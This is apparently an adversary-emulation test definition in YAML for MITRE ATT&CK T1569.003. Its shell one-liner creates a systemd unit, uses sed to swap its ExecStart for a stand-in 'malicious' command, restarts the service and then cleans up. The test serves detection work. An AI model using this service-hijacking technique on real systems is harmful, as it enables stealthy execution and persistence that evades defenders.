---
- id: 714854097bf6cd3175a5ab7e35b16147
  name: Modify Existing systemd Service to Execute Malicious Command
  description: 'Creates a service unit file that initially runs a benign command,
    then modifies the

    ExecStart directive using sed to substitute a malicious command before reloading
    and

    restarting the service. Adversaries may hijack existing services to blend in with
    normal

    service activity and avoid triggering detections focused solely on new service
    creation.


    This technique reflects the tradecraft observed in more sophisticated intrusions
    where

    blending into existing process trees is a priority over creating net-new services.

    '
  tactic: execution
  technique:
    attack_id: T1569.003
    name: 'System Services: Systemctl'
  platforms:
    linux:
      sh:
        command: 'if [ -x "$(command -v sed)" ]; then : ; else apt-get install -y
          sed 2>/dev/null || yum install -y sed 2>/dev/null || echo "Could not install
          sed automatically."; fi;  echo "[Unit]" > /etc/systemd/system/atomic-modify-test.service;
          echo "Description=Legitimate Looking Service" >> /etc/systemd/system/atomic-modify-test.service;
          echo "" >> /etc/systemd/system/atomic-modify-test.service; echo "[Service]"
          >> /etc/systemd/system/atomic-modify-test.service; echo "ExecStart=/bin/true"
          >> /etc/systemd/system/atomic-modify-test.service; echo "" >> /etc/systemd/system/atomic-modify-test.service;
          echo "[Install]" >> /etc/systemd/system/atomic-modify-test.service; echo
          "WantedBy=multi-user.target" >> /etc/systemd/system/atomic-modify-test.service;
          systemctl daemon-reload; sed -i ''s|ExecStart=.*|ExecStart=/bin/bash -c
          "echo hijacked > /tmp/atomic_hijack_output.txt"|'' /etc/systemd/system/atomic-modify-test.service;
          systemctl daemon-reload; systemctl start atomic-modify-test.service; systemctl
          status atomic-modify-test.service'
        payloads: []
        cleanup: systemctl stop atomic-modify-test.service 2>/dev/null || true; systemctl
          disable atomic-modify-test.service 2>/dev/null || true; rm -f /etc/systemd/system/atomic-modify-test.service;
          systemctl daemon-reload; rm -f /tmp/atomic_hijack_output.txt
